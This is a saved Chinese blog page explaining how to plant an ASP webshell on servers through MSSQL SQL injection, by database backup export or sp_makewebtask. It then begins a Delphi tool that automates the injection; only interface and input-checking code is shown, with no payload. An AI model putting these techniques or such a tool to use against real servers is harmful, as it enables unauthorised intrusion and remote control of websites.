+<p>一．通过SQL注入得到WEBSHELL的原理: N.E.V.E.R的方法：利用数据库备份得到WEBSHELL。创建一个表，在表中建一个字段用来保存木马数据。然后利用MSSQL导出库文件的办法把整个数据导出来，最后再删除新建的表。 分析: N.E.V.E.R利用了MSSQL的备份数据库功能。把数</p>
+<h3>一．通过SQL注入得到WEBSHELL的原理:</h3>
+<p>N.E.V.E.R的方法：利用数据库备份得到WEBSHELL。创建一个表，在表中建一个字段用来保存木马数据。然后利用MSSQL导出库文件的办法把整个数据导出来，最后再删除新建的表。<br>
+分析: N.E.V.E.R利用了MSSQL的备份数据库功能。把数据导出来，设想数据库中有&lt;%%&gt;之类的ASP标实符，导出文件，文件名以.ASP的形式保存。然后文件又保存在WEB的路径下。那么这个导出的ASP文件是不是要去解释&lt;%%&gt; 之内的语句呢？如果数据库中有的表中有&lt;%%&gt;标实符，并且这之中有错误，那么我们导出来生成的ASP文件也会有误。不过，这种机会也不太大。<br>
+再来看看CZY的方法吧。 CZY的方法：前面的和N.E.V.E.R的方法基本上差不多。只是后面用到了扩展存储过程——sp_makewebtask。这个扩展存储过程的作用就是：可以把MSSQL数据库中的某个表中的记录导出来，以文件的方法保存起来。这种方法就不会出现什么问题原因在于：我们只去读表中的某个字段中的值。把字段的信息导出来生成文件。这个字段中的值都是我们刚加上的。自己在加入数据的时候，先调试一下，没有问题在加入进去，导出来就当然没有问题了。<br>
+以上两位的方法，我都手工测试过。利用SQL注入漏洞，建表，向表中加数据，然后再导出数据，再删除表。都是利用的SQL语句。这里我就不多说了，大家可以看本期的文章。</p>
+<h3>二．利用DELPHI去实现功能的前言</h3>
+<p>原理都分析过了。我们怎么利用DELPHI来实现他们的手工操作呢？其实方法是非常简单的。DELPHI提供了一个NMHTTP控件。我们利用这个控件就可以向某个特定的URL提交参数。然后实现我们的自动注射功能。我马上要为大家讲解的这个程序，有一个特点。也可以说成是一个缺陷吧。程序不去自动猜解WEB的绝对路径。程序不去判断当前连接SQL数据库的当前账号的权限。我为什么要这么做？因为得到这两者用SQL注入是非常难得到的。所以，我们程序发送命令就不会考虑太多。成不成功你执行完自己去看看生成没有就OK了。</p>
+<h3>三．如何利用DELPHI得到WEBSHELL。</h3>
+<p>程序中用到的值。我们这里来看看有哪些：URL路径，远程WEB绝对路径(通过其他方法得到,你一定有办法的) 采用什么方法去得到WEBSHELL(也就是两位的方法，你选哪一种)。我们同时要求点击一个按纽开始执行命令，和点击一个按纽来终止命今。最后就是新建的表的名称，以及表的字段名称，再次就是字段的类型。前面的我们在程序中放上输入，选择之类的控件就行了。后面的我们设一个选项按纽点按纽弹出相应设置。再把这些相应的设置用一个RECORD来保存。<br>
+首先，我们在DIT控件。名称分别是：UrlET //URL路径的输入框、ShellPathET //远程木马的位置、CustomBdoorET//自定义木马的位置。再放两个RadioButton用来选择采用什么方式获取WEBSHELL。CAPTION分别取名为： BackUP DataBase 和 WEB作业。然后再放三个SpeedButtion按纽。名称分别是：设置，开始，停止, 最后再放一个MEMO控件。来显示当前添加的信息。到此界面上的工作就做完了。界面如图：<br>
+现在来写程序了。 我们首先定义一个RECORD。 如下：<br>
+Type<br>
+SetOption = Record<br>
+TableName : String; //用来保存要创建的表名.<br>
+FieldName : String; //用来保存要创建的字段名.<br>
+FiledType : String; //用来保存创建的字段名类型.<br>
+End;<br>
+FiledType字段类型的值是以下类型的一种：<br>
+Bigint binary bit char datetime decimal float image int money nchar ntext numeric nvarchar real smalldatetime smallint Smallmoney sql_variant text timestamp tinyint uniqueidentifier varbinary varchar<br>
+这些都是MSSQL字段类型值.<br>
+再定义一个全局变量：<br>
+Var<br>
+ISStop : Boolean; //用来判断用户是否按下了停止按纽.<br>
+好了。在表单创建的过程中，我们为RECORD记录输入默认值.<br>
+代码如下：<br>
+procedure TMainForm.FormCreate(Sender: TObject);<br>
+begin sOption.TableName :=’cyfd’<br>
+sOption.FieldName :=’gmemo’<br>
+sOption.FiledType :=’text’<br>
+end;<br>
+现在我们添加开始执行命令的代码。<br>
+先定义BDoorList 为TstringList。主要目的就是把木马的内容加进来.<br>
+创建两个变量来保存urlET.和ShellPathET的值.方便程序简化调用. 在程序开始执行前,我们得先检查一下用户的输入<br>
+定义一个Checkinput函数.<br>
+如下：<br>
+Function CheckInput : Boolean;<br>
+Begin Result := False;<br>
+if Trim(urlet.Text) = ’’ then<br>
+Begin<br>
+Application.MessageBox(’请输入URL地址!’,’提示’,mb_ok mb_iconinformation);<br>
+Exit;<br>
+End;<br>
+if Trim(ShellPathET.Text) = ’’ then<br>
+Begin<br>
+Application.MessageBox(’请输入文件保存地址!’,’提示’,mb_ok mb_iconinformation);<br>
+Exit;<br>
+End;<br>
+IF DefBDoor.Checked then<br>
+Begin<br>
+if Not FileExists(extractfilepath(Application.ExeName) ’默认木马.txt’) then<br>
+Begin<br>
+Application.MessageBox(’没有找到 [默认木马.txt] 文件!’,’提示’,mb_ok mb_iconinformation);<br>
+Exit;<br>
+End;<br>
+End<br>
+Else if Not FileExists(CustomBdoorET.Text) then<br>
+Begin<br>
+Application.MessageBox(’没有找到所选的木马文件!’,’提示’,mb_ok mb_iconinformation);<br>
+Exit;<br>
+End;<br>
+Result := True;<br>
+End;</p>
+
+          </div>
+        </div>
+    </div>
+
+    <!-- 如果是付费文章，未购买，则显示购买按钮 -->
+
+    <!-- 连载目录项 -->
+
+    <!-- 如果是付费文章 -->
+      <!-- 如果是付费连载，已购买，且作者允许赞赏，则显示付费信息和赞赏 -->
+        <div id="free-reward-panel" class="support-author"><p>小礼物走一走，来简书关注我</p> <div class="btn btn-pay">赞赏支持</div> <div class="supporter"><ul class="support-list"></ul> <!----></div> <!----> <!----></div>
+
+      <div class="show-foot">
+        <a class="notebook" href="https://www.jianshu.com/nb/4997479">
+          <i class="iconfont ic-search-notebook"></i>
+          <span>奇技淫巧</span>
+</a>        <div class="copyright" data-toggle="tooltip" data-html="true" data-original-title="转载请联系作者获得授权，并标注“简书作者”。">
+          © 著作权归作者所有
+        </div>
+        <div class="modal-wrap" data-report-note="">
+          <a id="report-modal">举报文章</a>
+        </div>
+      </div>
+
+      <!-- 文章底部作者信息 -->
+        <div class="follow-detail">
+          <div class="info">
+            <a class="avatar" href="https://www.jianshu.com/u/b91eabbc6024">
+              <img src="./webshell原理_files/ca1f908386ab.jpeg" alt="96">
+</a>            <a class="btn btn-success follow"><i class="iconfont ic-follow"></i><span>关注</span></a>
+            <a class="title" href="https://www.jianshu.com/u/b91eabbc6024">JackyTsuuuy</a>
+          <p>写了 43040 字，被 145 人关注，获得了 139 个喜欢</p></div>
+            <div class="signature">不可描述</div>
+        </div>
+
+    <div class="meta-bottom">
+      <div data-v-6ddd02c6="" class="like"><div data-v-6ddd02c6="" class="btn like-group"><div data-v-6ddd02c6="" class="btn-like"><a data-v-6ddd02c6="">喜欢</a></div> <div data-v-6ddd02c6="" class="modal-wrap"><a data-v-6ddd02c6="">10</a></div></div> <!----></div>
+      <div class="share-group">
+        <a class="share-circle" data-action="weixin-share" data-toggle="tooltip" data-original-title="分享到微信">
+          <i class="iconfont ic-wechat"></i>
+        </a>
+        <a class="share-circle" data-action="weibo-share" data-toggle="tooltip" href="javascript:void((function(s,d,e,r,l,p,t,z,c){var%20f=&#39;http://v.t.sina.com.cn/share/share.php?appkey=1881139527&#39;,u=z||d.location,p=[&#39;&amp;url=&#39;,e(u),&#39;&amp;title=&#39;,e(t||d.title),&#39;&amp;source=&#39;,e(r),&#39;&amp;sourceUrl=&#39;,e(l),&#39;&amp;content=&#39;,c||&#39;gb2312&#39;,&#39;&amp;pic=&#39;,e(p||&#39;&#39;)].join(&#39;&#39;);function%20a(){if(!window.open([f,p].join(&#39;&#39;),&#39;mb&#39;,[&#39;toolbar=0,status=0,resizable=1,width=440,height=430,left=&#39;,(s.width-440)/2,&#39;,top=&#39;,(s.height-430)/2].join(&#39;&#39;)))u.href=[f,p].join(&#39;&#39;);};if(/Firefox/.test(navigator.userAgent))setTimeout(a,0);else%20a();})(screen,document,encodeURIComponent,&#39;&#39;,&#39;&#39;,&#39;&#39;, &#39;推荐 @JackyTsuuuy 的文章《webshell原理》（ 分享自 @简书 ）&#39;,&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weibo&#39;,&#39;页面编码gb2312|utf-8默认gb2312&#39;));" data-original-title="分享到微博">
+          <i class="iconfont ic-weibo"></i>
+        </a>
+        <a class="share-circle" data-toggle="tooltip" id="longshare" target="_blank" data-original-title="" title="">
+            <div class="qrcode" id="qrcode">
+             <img src="./webshell原理_files/download-index-side-qrcode-cb13fc9106a478795f8d10f9f632fccf.png" alt="Download index side qrcode">
+             <p>下载app生成长微博图片</p>
+             </div>
+          <i class="iconfont ic-picture"></i>
+        </a>
+        <a class="share-circle more-share" tabindex="0" data-toggle="popover" data-placement="top" data-html="true" data-trigger="focus" href="javascript:void(0);" data-content="
+          &lt;ul class=&quot;share-list&quot;&gt;
+            &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=qzone&#39;)+&#39;&amp;title=&#39;+e(&#39;推荐 JackyTsuuuy 的文章《webshell原理》&#39;),x=function(){if(!window.open(r,&#39;qzone&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=600,height=600&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-zone&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到QQ空间&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://twitter.com/share?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=twitter&#39;)+&#39;&amp;text=&#39;+e(&#39;推荐 JackyTsuuuy 的文章《webshell原理》（ 分享自 @jianshucom ）&#39;)+&#39;&amp;related=&#39;+e(&#39;jianshucom&#39;),x=function(){if(!window.open(r,&#39;twitter&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=600,height=600&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-twitter&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://www.facebook.com/dialog/share?app_id=483126645039390&amp;display=popup&amp;href=https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=facebook&#39;,x=function(){if(!window.open(r,&#39;facebook&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-facebook&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到Facebook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://plus.google.com/share?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=google_plus&#39;),x=function(){if(!window.open(r,&#39;google_plus&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-google&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到Google+&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,s1=window.getSelection,s2=d.getSelection,s3=d.selection,s=s1?s1():s2?s2():s3?s3.createRange().text:&#39;&#39;,r=&#39;http://www.douban.com/recommend/?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=douban&#39;)+&#39;&amp;title=&#39;+e(&#39;webshell原理&#39;)+&#39;&amp;sel=&#39;+e(s)+&#39;&amp;v=1&#39;,x=function(){if(!window.open(r,&#39;douban&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r+&#39;&amp;r=1&#39;};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})()&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-douban&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到豆瓣&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+          &lt;/ul&gt;
+        " data-original-title="" title="">更多分享</a>
+      </div>
+    </div>
+
+      <a id="web-note-ad-1" target="_blank" href="https://www.jianshu.com/apps/redirect?utm_source=note-bottom-click"><img src="./webshell原理_files/web-note-ad-1-c2e1746859dbf03abe49248893c9bea4.png" alt="Web note ad 1"></a>
+
+    <!--
+    <div id="note-comment-above-ad-container">
+      <span id="youdao-comment-ad" class="ad-badge">广告</span>
+    </div>
+    -->
+    <div><div id="comment-list" class="comment-list"><div><form class="new-comment"><a class="avatar"><img src="./webshell原理_files/avatar_default-78d4d1f68984cd6d4379508dd94b4210.png"></a> <div class="sign-container"><a href="https://www.jianshu.com/sign_in?utm_source=desktop&amp;utm_medium=not-signed-in-comment-form" class="btn btn-sign">登录</a> <span>后发表评论</span></div></form> <!----></div> <!----> <div class="comments-placeholder" style="display: none;"><div class="author"><div class="avatar"></div> <div class="info"><div class="name"></div> <div class="meta"></div></div></div> <div class="text"></div> <div class="text animation-delay"></div> <div class="tool-group"><i class="iconfont ic-zan-active"></i><div class="zan"></div> <i class="iconfont ic-list-comments"></i><div class="zan"></div></div></div> <div id="normal-comment-list" class="normal-comment-list"><div><div><div class="top-title"><span>2条评论</span> <a class="author-only">只看作者</a> <a class="close-btn" style="display: none;">关闭评论</a> <div class="pull-right"><a class="active">按时间倒序</a><a class="">按时间正序</a></div></div></div> <!----> <!----> <div class="comments-placeholder" style="display: none;"><div class="author"><div class="avatar"></div> <div class="info"><div class="name"></div> <div class="meta"></div></div></div> <div class="text"></div> <div class="text animation-delay"></div> <div class="tool-group"><i class="iconfont ic-zan-active"></i><div class="zan"></div> <i class="iconfont ic-list-comments"></i><div class="zan"></div></div></div> <div id="comment-29111328" class="comment"><div><div class="author"><div data-v-f3bf5228="" class="v-tooltip-container" style="z-index: 0;"><div class="v-tooltip-content"><a href="https://www.jianshu.com/u/63fe6b5fc9e9" target="_blank" class="avatar"><img src="./webshell原理_files/b624e0c4-c8e4-4e45-ab41-3fdae11dfa71.jpg"></a>  </div> <!----></div> <div class="info"><a href="https://www.jianshu.com/u/63fe6b5fc9e9" target="_blank" class="name">Meqiquan</a> <!----> <!----> <div class="meta"><span>3楼 · 2018.09.29 09:19</span></div></div></div> <div class="comment-wrap"><p>老哥，后面的图片好像没了😂</p> <!----> <div class="tool-group"><a data-v-cdecbe24="" id="like-button-29111328" class="like-button"><span data-v-cdecbe24="">赞</span></a> <a class=""><i class="iconfont ic-comment"></i> <span>回复</span></a> <!----> <!----></div></div></div> <div class="sub-comment-list hide"><!----> <!----></div></div><div id="comment-13310387" class="comment"><div><div class="author"><div data-v-f3bf5228="" class="v-tooltip-container" style="z-index: 0;"><div class="v-tooltip-content"><a href="https://www.jianshu.com/u/01fabbd826ec" target="_blank" class="avatar"><img src="./webshell原理_files/8b12f4ed2024.JPG"></a>  </div> <!----></div> <div class="info"><a href="https://www.jianshu.com/u/01fabbd826ec" target="_blank" class="name">示水</a> <!----> <!----> <div class="meta"><span>2楼 · 2017.07.28 01:07</span></div></div></div> <div class="comment-wrap"><p><img src="./webshell原理_files/+1.png" alt=":+1:" title=":+1:" class="emoji" width="20" height="20"></p> <!----> <div class="tool-group"><a data-v-cdecbe24="" id="like-button-13310387" class="like-button"><span data-v-cdecbe24="">赞</span></a> <a class=""><i class="iconfont ic-comment"></i> <span>回复</span></a> <!----> <!----></div></div></div> <div class="sub-comment-list hide"><!----> <!----></div></div></div></div> <!----> <div><!----></div></div></div>
+  </div>
+
+  <div class="side-tool"><ul><li data-placement="left" data-toggle="tooltip" data-container="body" data-original-title="回到顶部" style="display: none;"><a class="function-button"><i class="iconfont ic-backtop"></i></a></li> <!----> <!----> <!----> <!----> <li data-placement="left" data-toggle="tooltip" data-container="body" data-original-title="分享文章" id="share"><a tabindex="0" role="button" data-toggle="popover" data-placement="left" data-html="true" data-trigger="focus" href="javascript:void(0);" data-content="&lt;ul class=&#39;share-list&#39; style=&quot;width:220px&quot;&gt;
+                  &lt;li&gt;&lt;a class=&quot;weixin-share&quot;&gt;&lt;i class=&quot;social-icon-sprite social-icon-weixin&quot;&gt;&lt;/i&gt;&lt;span&gt;分享到微信&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;javascript:void((function(s,d,e,r,l,p,t,z,c){var%20f=&#39;http://v.t.sina.com.cn/share/share.php?appkey=1881139527&#39;,u=z||d.location,p=[&#39;&amp;url=&#39;,e(u),&#39;&amp;title=&#39;,e(t||d.title),&#39;&amp;source=&#39;,e(r),&#39;&amp;sourceUrl=&#39;,e(l),&#39;&amp;content=&#39;,c||&#39;gb2312&#39;,&#39;&amp;pic=&#39;,e(p||&#39;&#39;)].join(&#39;&#39;);function%20a(){if(!window.open([f,p].join(&#39;&#39;),&#39;mb&#39;,[&#39;toolbar=0,status=0,resizable=1,width=440,height=430,left=&#39;,(s.width-440)/2,&#39;,top=&#39;,(s.height-430)/2].join(&#39;&#39;)))u.href=[f,p].join(&#39;&#39;);};if(/Firefox/.test(navigator.userAgent))setTimeout(a,0);else%20a();})(screen,document,encodeURIComponent,&#39;&#39;,&#39;&#39;,&#39;&#39;, &#39;推荐 @JackyTsuuuy 的文章《webshell原理》（ 分享自 @简书 ）&#39;,&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weibo&#39;,&#39;页面编码gb2312|utf-8默认gb2312&#39;));&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-weibo&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到微博&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  
+                  &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=qzone&#39;)+&#39;&amp;title=&#39;+e(&#39;推荐 JackyTsuuuy 的文章《webshell原理》&#39;),x=function(){if(!window.open(r,&#39;qzone&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=600,height=600&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-zone&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到QQ空间&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://twitter.com/share?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=twitter&#39;)+&#39;&amp;text=&#39;+e(&#39;推荐 JackyTsuuuy 的文章《webshell原理》（ 分享自 @jianshucom ）&#39;)+&#39;&amp;related=&#39;+e(&#39;jianshucom&#39;),x=function(){if(!window.open(r,&#39;twitter&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=600,height=600&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-twitter&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://www.facebook.com/dialog/share?app_id=483126645039390&amp;display=popup&amp;href=https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=facebook&#39;,x=function(){if(!window.open(r,&#39;facebook&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-facebook&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到Facebook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,r=&#39;https://plus.google.com/share?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=google_plus&#39;),x=function(){if(!window.open(r,&#39;google_plus&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})();&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-google&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到Google+&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;javascript:void(function(){var d=document,e=encodeURIComponent,s1=window.getSelection,s2=d.getSelection,s3=d.selection,s=s1?s1():s2?s2():s3?s3.createRange().text:&#39;&#39;,r=&#39;http://www.douban.com/recommend/?url=&#39;+e(&#39;https://www.jianshu.com/p/02aac12e459f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=douban&#39;)+&#39;&amp;title=&#39;+e(&#39;webshell原理&#39;)+&#39;&amp;sel=&#39;+e(s)+&#39;&amp;v=1&#39;,x=function(){if(!window.open(r,&#39;douban&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r+&#39;&amp;r=1&#39;};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})()&quot;&gt;&lt;i class=&#39;social-icon-sprite social-icon-douban&#39;&gt;&lt;/i&gt;&lt;span&gt;分享到豆瓣&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;" data-original-title="" title="" class="function-button"><i class="iconfont ic-share"></i></a> <!----></li> <!----></ul></div>
+</div>
+<div class="note-bottom">
+  <div><div class="main"><div class="title">被以下专题收入，发现更多相似内容</div> <!----> <div class="include-collection"><!----> <a href="https://www.jianshu.com/c/36ff41ca335a?utm_source=desktop&amp;utm_medium=notes-included-collection" target="_blank" class="item"><img src="./webshell原理_files/0a2a3847608fb380249c9ec767374d2a.jpeg"><div class="name">安全学习</div></a> <!----></div></div> <!----> <!----></div>
+  <div><div class="recommend-note"><div class="meta"><div class="title">
+        推荐阅读
+        <a target="_blank" href="https://www.jianshu.com/" class="more">
+           更多精彩内容<i class="iconfont ic-link"></i></a></div></div> <div class="list"><div class="note have-img"><a target="_blank" href="https://www.jianshu.com/p/f315fcfe0357?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="cover" style="background-image: url(&quot;//upload-images.jianshu.io/upload_images/7748510-b6ac3de6eb511558.jpeg?imageMogr2/auto-orient/strip|imageView2/1/w/300/h/240/format/webp&quot;);"></a> <a target="_blank" href="https://www.jianshu.com/p/f315fcfe0357?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="title">希望，就像钻石一样珍贵</a> <p class="description">2019年2月21日，星期四，天气晴 看完电影《流浪地球》后，觉得它之所以吸引人，就在于故事的情节，总是给你各种各样的危机，一波接着一波，让人身临其境，时刻揪心不易。 故事一开始，主人公刘启就带着他的妹妹朵朵，买了两套假的宇航服后，走出了地下城市，去往了地面。 期间被贩卖宇航服的人发现问题，两人开始疯狂逃跑。去往地面之后，因为开车的技术差，又撞到了旁边的车，后来因为违规驾驶被抓进监狱。 从这时开始，大大小小的危机，就开始抓住人们的心，忽起忽落。后来由于木星的引力问题，好多星际发动机停止运行，灾难大规模的发生。 伴随着大量人员的逃亡，拯救火石计划的展开，期间又不断的有人死去，包括朵朵爷爷的...</p> <a target="_blank" href="https://www.jianshu.com/u/f627d3b0534e?utm_campaign=maleskine&amp;utm_content=user&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="author"><div class="avatar" style="background-image: url(&quot;//upload.jianshu.io/users/upload_avatars/7748510/35bc6ab0-8eac-4397-a67c-10801f3fc1cf.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/24/h/24/format/webp&quot;);"></div> <span class="name">11山山</span></a></div><div class="note"><!----></div><div class="note have-img"><a target="_blank" href="https://www.jianshu.com/p/0e732d765e0e?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="cover" style="background-image: url(&quot;//upload-images.jianshu.io/upload_images/7076633-01c4526e778cc6da.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/300/h/240/format/webp&quot;);"></a> <a target="_blank" href="https://www.jianshu.com/p/0e732d765e0e?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="title">你是真的忙，还是在假装？</a> <p class="description">每天十点之后甚至十二点之后，我的朋友圈总有人更新状态“加班到现在，感觉充实而又收获满满的一天。”或者“凌晨的北京真的很美，继续努力。”然后坐等朋友点赞，夸奖，鼓励。 我猜不出这条朋友圈是给谁看的？是要鼓励自己，给自己打气？是要向朋友和同事显示自己的努力？还是向领导和老板邀功，说明自己为公司做的贡献？ 现在的很多人竟然以加班次数作为评判自己努力与否的标准。可是工作不是打游戏升级，不是挂机时间越长就越能提升等级。 而有些人加班是表演给领导看的，明明没什么着急的事，别人不走我也不走。别人都加班，我走了就显得工作不积极，会给领导留下不好的印象。这种人把加班搞成了军备竞赛，看谁加班次数多，看谁加的...</p> <a target="_blank" href="https://www.jianshu.com/u/bf22bcea6981?utm_campaign=maleskine&amp;utm_content=user&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="author"><div class="avatar" style="background-image: url(&quot;//upload.jianshu.io/users/upload_avatars/7076633/194640b2-8bb3-46d5-89af-ccb2b5c4f84e.JPG?imageMogr2/auto-orient/strip|imageView2/1/w/24/h/24/format/webp&quot;);"></div> <span class="name">夕荣</span></a></div><div class="note have-img"><a target="_blank" href="https://www.jianshu.com/p/1f34ebf03a93?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="cover" style="background-image: url(&quot;//upload-images.jianshu.io/upload_images/10773282-50a0c5bf6e4fca6c.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/300/h/240/format/webp&quot;);"></a> <a target="_blank" href="https://www.jianshu.com/p/1f34ebf03a93?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="title">七律•春日放晴和同学郊游有感</a> <p class="description">春日融融约野游，当年同学闹农畴。 贪酸隽味青梅早，嗟苦寒伧辛蓼遒。 半百已分天诏凤，一生可笑庙牺牛。 田园弃我归来晚，绿嫩红娇鸟啭柔。 【典源】《庄子·列御寇》:“或聘于庄子。庄子应其使曰:‘子见夫牺牛乎? 衣以文绣,食以刍叔,及其牵而入于太庙,虽欲为孤犊,其可得乎!’”《史记·老子韩非列传》:“楚威王闻庄周贤,使使厚币迎之,许以为相。庄周笑谓楚使者曰:‘千金,重利; 卿相,尊位也。子独不见郊祭之牺牛乎? 养食之数岁,衣以文绣,以入大庙。先是之时,虽欲为孤豚,岂可得乎? 子亟去,无污我。我宁游戏污渎之中自快,无为有国者所羁,终身不仕,以快吾志焉。’” 凤诏，为后赵武帝石虎所创。所谓“凤诏...</p> <a target="_blank" href="https://www.jianshu.com/u/e963210778be?utm_campaign=maleskine&amp;utm_content=user&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="author"><div class="avatar" style="background-image: url(&quot;//upload.jianshu.io/users/upload_avatars/10773282/7ef4cbd1-5bf4-43ae-a8bb-36ab4aaf0ff8.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/24/h/24/format/webp&quot;);"></div> <span class="name">落花淡影</span></a></div><div class="note have-img"><a target="_blank" href="https://www.jianshu.com/p/6f67d6b6bc4f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=pc_all_hots&amp;utm_source=recommendation" class="cover" style="background-image: url(&quot;//upload-images.jianshu.io/upload_images/937049-6852ed74f98bb36e.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/300/h/240/format/webp&quot;);"></a> <a target="_blank" 